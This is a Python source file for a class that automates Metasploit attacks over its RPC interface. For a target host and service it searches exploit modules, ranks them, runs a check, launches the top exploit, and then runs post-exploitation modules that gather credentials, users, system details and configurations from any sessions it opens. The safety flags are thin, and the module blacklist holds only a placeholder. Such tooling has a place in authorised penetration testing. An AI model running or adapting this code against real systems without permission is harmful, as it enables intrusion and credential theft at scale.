import time
import json
import logging
from typing import Dict, List, Optional, Tuple

# pip install pymetasploit3
from pymetasploit3.msfrpc import MsfRpcClient

LOG = logging.getLogger("msfrpc_trigger")
LOG.setLevel(logging.DEBUG)
handler = logging.StreamHandler()
handler.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)s: %(message)s"))
LOG.addHandler(handler)
print("MsfrpcTrigger logger initialized.")

class MsfrpcTrigger:
    def __init__(self, rpc_password: str, rpc_user: str = "msf", rpc_host: str = "127.0.0.1",
                 rpc_port: int = 55553, ssl: bool = False, safe_mode: bool = True, dry_run: bool = False):
        """
        rpc_password: password for msfrpcd
        rpc_user: user (commonly 'msf')
        rpc_host: host where msfrpcd is listening
        rpc_port: msfrpcd port (default for msfrpcd is typically 55553 when SSL; adjust accordingly)
        ssl: if msfrpcd was started with SSL
        safe_mode: disallow blacklisted/destructive choices
        dry_run: do not actually execute exploit, only return plan and checks
        """
        self.rpc_password = rpc_password
        self.rpc_user = rpc_user
        self.rpc_host = rpc_host
        self.rpc_port = rpc_port
        self.ssl = ssl
        self.safe_mode = safe_mode
        self.dry_run = dry_run
        self.client: Optional[MsfRpcClient] = None

        # Basic blacklists/whitelists - extend this for your policy
        self.module_blacklist = set([
            # Example destructive modules - add as needed
            "exploit/windows/local/psp_..._destructive",  # placeholder
        ])

        # Post-exploit modules to run automatically (safe, enumerative)
        self.default_post_modules = [
            ("post/multi/gather/enum_creds", {}),
            ("post/multi/gather/enum_users", {}),
            ("post/multi/gather/enum_system", {}),
            ("post/multi/gather/enum_configs", {}),
        ]

    def connect(self, timeout: int = 30) -> bool:
        """Connect to msfrpcd server. Returns True if connected."""
        try:
            LOG.info("Connecting to msfrpcd at %s:%s", self.rpc_host, self.rpc_port)
            self.client = MsfRpcClient(self.rpc_password, ssl=self.ssl, server=self.rpc_host, port=self.rpc_port)
            LOG.info("Connected to msfrpcd as RPC user (OK)")
            return True
        except Exception as e:
            LOG.exception("Failed to connect to msfrpcd: %s", e)
            return False

    def search_modules(self, query: str, mod_type: str = "exploit") -> List[Dict]:
        """
        Search modules by text (e.g., service name, product name, CVE, etc.).
        Returns list of module dicts from pymetasploit3 search response.
        """
        assert self.client is not None, "Not connected"
        LOG.debug("Searching for modules with query=%s type=%s", query, mod_type)
        try:
            results = self.client.modules.search(query, mod_type)
            LOG.debug("Found %d modules", len(results))
            return results
        except Exception:
            LOG.exception("Module search failed for query=%s", query)
            return []

    def module_info(self, module_fullname: str) -> Dict:
        """
        Return module info via RPC. module_fullname like 'exploit/unix/ftp/proftpd_modcopy_bof'
        """
        assert self.client is not None, "Not connected"
        try:
            # module type, name split
            mod_type, _, name = module_fullname.partition("/")
            # pymetasploit3 expects ('exploit','module_name') -> but search returns dicts
            info = self.client.modules.get_module(module_fullname)
            return info
        except Exception:
            LOG.exception("Failed to get info for module %s", module_fullname)
            return {}

    def module_rank_score(self, info: Dict) -> int:
        """
        Simple conversion of module rank to numeric score.
        """
        rank = info.get("rank", "") or info.get("Rank", "")
        rank = str(rank).lower()
        mapping = {"excellent": 3, "great": 2, "good": 1, "normal": 0, "low": -1}
        return mapping.get(rank, 0)

    def run_check(self, module_ref: str, opts: Dict) -> Tuple[bool, Dict]:
        """
        Run module 'check' via RPC if supported.
        Returns (vulnerable_bool, check_response_dict)
        """
        assert self.client is not None, "Not connected"
        LOG.info("Running check on %s with options %s", module_ref, opts)
        try:
            mod = self.client.modules.use(*module_ref.split("/", 1))
            for k, v in opts.items():
                try:
                    mod[k] = v
                except Exception:
                    # some options might not exist; still continue
                    LOG.debug("Option %s could not be set on module %s", k, module_ref)
            if "check" in mod._module_documentation.get("actions", []) or hasattr(mod, "check"):
                result = mod.execute("check")
                LOG.debug("Check result: %s", result)
                # result structure depends on module; interpret heuristically:
                lowered = json.dumps(result).lower()
                vulnerable = ("vulnerable" in lowered) or ("likely vulnerable" in lowered) or ("exists" in lowered)
                return vulnerable, result
            else:
                LOG.debug("Module %s does not support check()", module_ref)
                return False, {"info": "no_check_supported"}
        except Exception:
            LOG.exception("Error while running check on %s", module_ref)
            return False, {"error": "exception"}

    def execute_exploit(self, module_ref: str, opts: Dict, payload_opts: Dict = None, background: bool = True) -> Dict:
        """
        Execute exploit via RPC. Returns info about job/session when available.
        """
        assert self.client is not None, "Not connected"
        LOG.info("Preparing to run exploit %s", module_ref)

        if self.safe_mode and module_ref in self.module_blacklist:
            LOG.warning("Module %s is blacklisted by policy. Aborting.", module_ref)
            return {"status": "blacklisted"}

        if self.dry_run:
            LOG.info("[dry_run] Exploit %s would be executed with opts=%s payload_opts=%s", module_ref, opts, payload_opts)
            return {"status": "dry_run", "module": module_ref, "opts": opts, "payload_opts": payload_opts}

        try:
            mod = self.client.modules.use(*module_ref.split("/", 1))
            # set options
            for k, v in opts.items():
                try:
                    mod[k] = v
                except Exception:
                    LOG.debug("Could not set option %s = %s for module %s", k, v, module_ref)

            # set payload options if provided
            if payload_opts:
                for k, v in payload_opts.items():
                    try:
                        mod[k] = v
                    except Exception:
                        LOG.debug("Could not set payload option %s = %s", k, v)

            # execute exploit
            action = "exploit"
            args = {}
            if background:
                args["background"] = True

            LOG.info("Executing exploit (background=%s)...", background)
            res = mod.execute(action, args)
            LOG.debug("Exploit execute returned: %s", res)
            return {"status": "launched", "raw": res}
        except Exception:
            LOG.exception("Failed to execute exploit %s", module_ref)
            return {"status": "error", "error": "exception"}

    def list_sessions(self) -> Dict:
        """Return current sessions via RPC."""
        assert self.client is not None, "Not connected"
        try:
            sessions = self.client.sessions.list
            LOG.debug("Sessions retrieved: %s", sessions)
            return sessions
        except Exception:
            LOG.exception("Failed to list sessions")
            return {}

    def run_post_exploit(self, session_id: int, post_modules: Optional[List[Tuple[str, Dict]]] = None) -> Dict:
        """
        Run safe post-exploit modules against a session.
        post_modules: list of (module_fullname, options)
        """
        assert self.client is not None, "Not connected"
        post_modules = post_modules or self.default_post_modules
        results = {}
        for mod_full, opts in post_modules:
            try:
                LOG.info("Running post module %s on session %s", mod_full, session_id)
                mod = self.client.modules.use(*mod_full.split("/", 1))
                # set SESSION option
                mod["SESSION"] = session_id
                for k, v in opts.items():
                    try:
                        mod[k] = v
                    except Exception:
                        LOG.debug("Option %s not settable on %s", k, mod_full)
                res = mod.execute("run")
                results[mod_full] = res
                LOG.debug("Post module %s result: %s", mod_full, res)
            except Exception:
                LOG.exception("Error running post module %s", mod_full)
                results[mod_full] = {"error": "exception"}
        return results

    # Utility: high level orchestrator for a single target / service
    def exploit_target(self, host: str, port: int, service: str, service_version: Optional[str] = None,
                       usernames: Optional[List[str]] = None, passwords: Optional[List[str]] = None,
                       payload: Optional[str] = None) -> Dict:
        """
        Orchestrate candidate discovery, checks, scoring, exploit launching, and session handling for one service.
        Returns a result dict describing the actions taken.
        """
        assert self.client is not None, "Not connected"
        # Build search query: try with service and version if available
        candidates = []
        search_queries = [service]
        if service_version:
            search_queries.append(f"{service} {service_version}")
            # maybe a more precise product token
            search_queries.append(service_version)

        # collect candidate modules
        for q in search_queries:
            found = self.search_modules(q, mod_type="exploit")
            for f in found:
                # module info keys likely include 'fullname' or 'path' depending on version of pymetasploit3
                fullname = f.get("fullname") or f.get("path") or f.get("name")
                # unify to "exploit/..." string if needed
                if fullname:
                    candidates.append(fullname)

        # dedupe
        candidates = list(dict.fromkeys(candidates))
        LOG.info("Candidate modules for %s:%s (%s) => %d", host, port, service, len(candidates))
        scored = []
        for module_ref in candidates:
            info = self.module_info(module_ref)
            score = self.module_rank_score(info)
            # prefer modules that mention the specific port in desc (small boost)
            desc = json.dumps(info).lower()
            if str(port) in desc:
                score += 1
            scored.append((module_ref, score, info))

        # sort by score descending
        scored.sort(key=lambda x: x[1], reverse=True)
        plan = {"host": host, "port": port, "service": service, "candidates": []}
        for module_ref, score, info in scored:
            plan["candidates"].append({"module": module_ref, "score": score, "rank": info.get("rank", "unknown")})

        if not scored:
            LOG.info("No candidate modules found.")
            return {"status": "no_candidates", "plan": plan}

        # Pick top candidate
        top_module, top_score, top_info = scored[0]
        LOG.info("Top candidate: %s (score=%s)", top_module, top_score)

        # Prepare options
        options = {"RHOSTS": host, "RPORT": port}
        if payload:
            options["PAYLOAD"] = payload
        # optionally include credential-based options if available
        # Example: USERNAME, PASSWORD
        if usernames and len(usernames) > 0:
            options["USERNAME"] = usernames[0]
        if passwords and len(passwords) > 0:
            options["PASSWORD"] = passwords[0]

        # Run check
        vulnerable, check_out = self.run_check(top_module, options)
        plan["chosen"] = top_module
        plan["check"] = {"vulnerable": vulnerable, "raw": check_out}

        if not vulnerable:
            LOG.info("Top module check did not indicate vulnerability. Aborting automatic exploit under safe settings.")
            return {"status": "not_vulnerable", "plan": plan}

        # Execute exploit
        exec_res = self.execute_exploit(top_module, options, payload_opts=None, background=True)
        plan["exploit"] = exec_res

        # Wait a bit then poll sessions
        time.sleep(3)
        sessions = self.list_sessions()
        plan["sessions"] = sessions

        # If new session present, run safe post-exploit tasks
        # Heuristic: look for any session with rhost == host
        created_sessions = {}
        for sid, s in sessions.items():
            try:
                sinfo = s
                if isinstance(sinfo, dict) and sinfo.get("peerhost") == host:
                    LOG.info("Found session %s for target %s", sid, host)
                    post_res = self.run_post_exploit(int(sid), None)
                    created_sessions[sid] = {"session": s, "post": post_res}
            except Exception:
                continue

        plan["created_sessions"] = created_sessions
        return {"status": "launched", "plan": plan}